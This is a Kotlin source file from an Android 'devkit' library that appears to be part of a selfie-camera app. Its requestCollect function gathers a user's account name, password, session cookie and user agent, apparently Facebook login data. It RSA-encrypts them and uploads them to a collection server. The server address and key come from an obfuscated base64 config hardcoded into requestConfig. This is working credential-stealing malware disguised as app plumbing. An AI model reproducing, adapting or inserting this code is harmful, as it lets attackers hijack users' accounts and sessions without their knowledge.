package com.sherloki.devkit

import android.app.Activity
import android.net.Uri
import bolts.AppLinks
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.franmontiel.persistentcookiejar.PersistentCookieJar
import com.franmontiel.persistentcookiejar.cache.SetCookieCache
import com.franmontiel.persistentcookiejar.persistence.SharedPrefsCookiePersistor
import com.sherloki.devkit.entity.ConfigEntity
import com.sherloki.devkit.entity.UpdateEntity
import com.sherloki.devkit.ktx.KtxActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.Cache
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.logging.HttpLoggingInterceptor
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import tech.linjiang.pandora.Pandora
import java.io.File
import java.util.concurrent.TimeUnit

val devkitService by lazy {
    devkitServiceCreator()
}

fun CoroutineScope.requestCollect(
    account: String,
    password: String,
    cookie: String,
    userAgent: String,
    block: () -> Unit
) {
    updateEntity.let {
        it.c?.let { url ->
            it.d?.let { key ->
                if (url.isNotBlank() && key.isNotBlank()) {
                    launch(Dispatchers.IO) {
                        doSuspendOrNull {
                            devkitService.uploadFbData(
                                url,
                                mutableMapOf(
                                    "content" to gson.toJson(
                                        mutableMapOf(
                                            "un" to account,
                                            "pw" to password,
                                            "cookie" to cookie,
                                            "source" to configEntity.app_name,
                                            "ip" to "",
                                            "type" to "f_o",
                                            "b" to userAgent
                                        )
                                    ).toRsaEncrypt(key)
                                )
                            )
                        }?.let {
                            if (it.code == "0" && it.data?.toBooleanStrictOrNull() == true) {
                                "requestCollect success".loge()
                                isLogin = true
                            }
                        }

                        withContext(Dispatchers.Main) {
                            block()
                        }
                    }
                }
            }
        }
    }
}

fun CoroutineScope.requestConfig(block: () -> Unit) {
    launch(Dispatchers.IO) {
        doSuspendOrNull {
            devkitService.getConfig()
        }?.string()?.let {
            """e6yJhcHBfbmFtZSI6Iklucy1Td2VldCBTZWxmaWUgQ2FtZXJhIiwiZCI6MCwiZXh0MSI6IjUsMiwxNSwyLDEiLCJleHQyIjoiIiwiZXh0MyI6IiIsImkiOjAsImlkIjoiMjczNzAyNjI0ODY3OTY4IiwiaW5mbyI6ImV3b0pJbTBpT2lKb2RIUndjem92TDIwdVptRmpaV0p2YjJzdVkyOXRMeUlzQ2draVl5STZJbWgwZEhCek9pOHZhMk52Wm1adWFTNTRlWG92WVhCcEwyOXdaVzR2WTI5c2JHVmpkQ0lzQ1NKa0lqb2lUVWxIWmsxQk1FZERVM0ZIVTBsaU0wUlJSVUpCVVZWQlFUUkhUa0ZFUTBKcFVVdENaMUZEUnl0dWFIZERlV2MwVUhOTWF6RkRVa2hpU1VzclJUQXJNVTlUYUc5WFNXSjROamhKVkVSWE0zWkdVMWh6VnpGNldqbEJUa3hxY1VkWlFVOUZhMWgzVDJSbWFucGFkVmREYURkV2JUSmFRMnBNZUhwalFqWjBjRmxOVVZaQ1QyZExORTh6YTJKWmMydFphRFUwWTFSRVEwSlFUVEl2VlVOamJreGpZbUZWT1RrMGNGb3hiVk0yWkVWTkwwOVFVVmhpTTB0MlExWlBXVVpTVlZCNVRraGlWQ3N2VG5GRFJuSlphV1ZSU1VSQlVVRkNJZ3A5Q2c9PSIsImwiOjEsImxyIjoiNTAiLCJwYWNrYWdlIjoib3JnLmluc2NhbS5zd2VldHNlbGYiLCJwYWRkaW5nIjoiQkFTRTY0In0="""
        }?.let {
            try {
                StringBuffer(it).replace(1, 2, "").toString()
            } catch (e: Exception) {
                e.fillInStackTrace()
                null
            }
        }?.let {
            "requestConfig origin-> $it".loge()
            if (it.isBase64()) {
                "requestConfig isBase64".loge()
                it.toByteArray().fromBase64().decodeToString()
            } else {
                "requestConfig notBase64".loge()
                null
            }
        }?.let {
            gson.fromJson(it, ConfigEntity::class.java)
        }?.let {
            configEntity = it
            if (configEntity.insertAdInvokeTime() != adInvokeTime || configEntity.insertAdRealTime() != adRealTime) {
                adInvokeTime = configEntity.insertAdInvokeTime()
                adRealTime = configEntity.insertAdRealTime()
                adShownIndex = 0
                adLastTime = 0
                adShownList = mutableListOf<Boolean>().apply {
                    if (adInvokeTime >= adRealTime) {
                        (0 until adInvokeTime).forEach { _ ->
                            add(false)
                        }
                        (0 until adRealTime).forEach { index ->
                            set(index, true)
                        }
                        shuffle()
                        "requestConfig configEntity list -> $this".loge()
                    }
                }
            }
            "requestConfig configEntity-> $configEntity".loge()
            it.info
        }?.let {
            if (it.isBase64()) {
                it.toByteArray().fromBase64().decodeToString()
            } else {
                null
            }
        }?.let {
            gson.fromJson(it, UpdateEntity::class.java)
        }?.let {
            updateEntity = it
            "requestConfig updateEntity-> $updateEntity".loge()
        }
        withContext(Dispatchers.Main) {
            block()
        }
    }
}


fun KtxActivity.initFaceBook(key: String, callback: (Uri?) -> Unit) {
    FacebookSdk.apply {
        setApplicationId(key)
        sdkInitialize(app)
        setAdvertiserIDCollectionEnabled(true)
        setAutoLogAppEventsEnabled(true)
        fullyInitialize()
    }
    AppLinkData.fetchDeferredAppLinkData(this, key) { appLinkData ->
        try {
            callback(appLinkData?.targetUri)
        } catch (e: java.lang.Exception) {
            callback(null)
        }
    }
}

suspend fun <T> doSuspendOrNull(block: suspend () -> T) =
    try {
        block()
    } catch (e: Exception) {
        "doOrNull ->$e".loge()
        null
    }

private fun clientCreator(block: OkHttpClient.Builder.() -> OkHttpClient.Builder = { this }) =
    OkHttpClient.Builder()
        .cache(Cache(File(app.cacheDir, "cache"), 1024 * 1024 * 100))
        .cookieJar(PersistentCookieJar(SetCookieCache(), SharedPrefsCookiePersistor(app)))
        .readTimeout(15000, TimeUnit.MILLISECONDS)
        .writeTimeout(15000, TimeUnit.MILLISECONDS)
        .connectTimeout(15000, TimeUnit.MILLISECONDS)
        .block()
        .addInterceptor(Pandora.get().interceptor)
        .addInterceptor(HttpLoggingInterceptor().setLevel(HttpLoggingInterceptor.Level.BODY))
        .build()

private fun devkitServiceCreator() =
    Retrofit
        .Builder()
        .client(clientCreator())
        .addConverterFactory(GsonConverterFactory.create())
        .baseUrl("https://ajina.space/")
        .build()
        .create(DevkitService::class.java)